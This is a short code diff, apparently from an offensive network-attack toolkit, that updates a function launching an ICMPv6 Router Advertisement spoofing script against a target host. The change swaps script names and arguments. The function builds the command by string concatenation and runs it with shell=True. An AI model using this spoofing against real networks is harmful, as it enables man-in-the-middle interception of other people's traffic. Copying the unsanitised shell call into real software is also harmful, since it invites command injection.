@@ -104,10 +104,9 @@ def make_ra_spoof(network_interface, target_mac_address, target_ipv6_address,
                   gateway_ipv6_address, prefix, your_local_ipv6_address):
 
     # Start Router Advertise spoofing script
-    sub.Popen(['python ' + project_root_path + '/Scripts/ICMPv6/icmpv6_ra_spoof.py --interface ' + network_interface +
-               ' --target_ip ' + target_ipv6_address + ' --target_mac ' + target_mac_address +
-               ' --gateway_ip ' + gateway_ipv6_address + ' --ipv6_prefix ' + prefix +
-               ' --dns_ip ' + your_local_ipv6_address + ' --quiet &'],
+    sub.Popen(['python3 ' + project_root_path + '/Scripts/ICMPv6/icmpv6_spoof.py --interface ' + network_interface +
+               ' --technique 1 --target_ip ' + target_ipv6_address + ' --target_mac ' + target_mac_address +
+               ' --gateway_ip ' + gateway_ipv6_address + ' --quiet &'],
               shell=True)
 
     # Wait 3 seconds
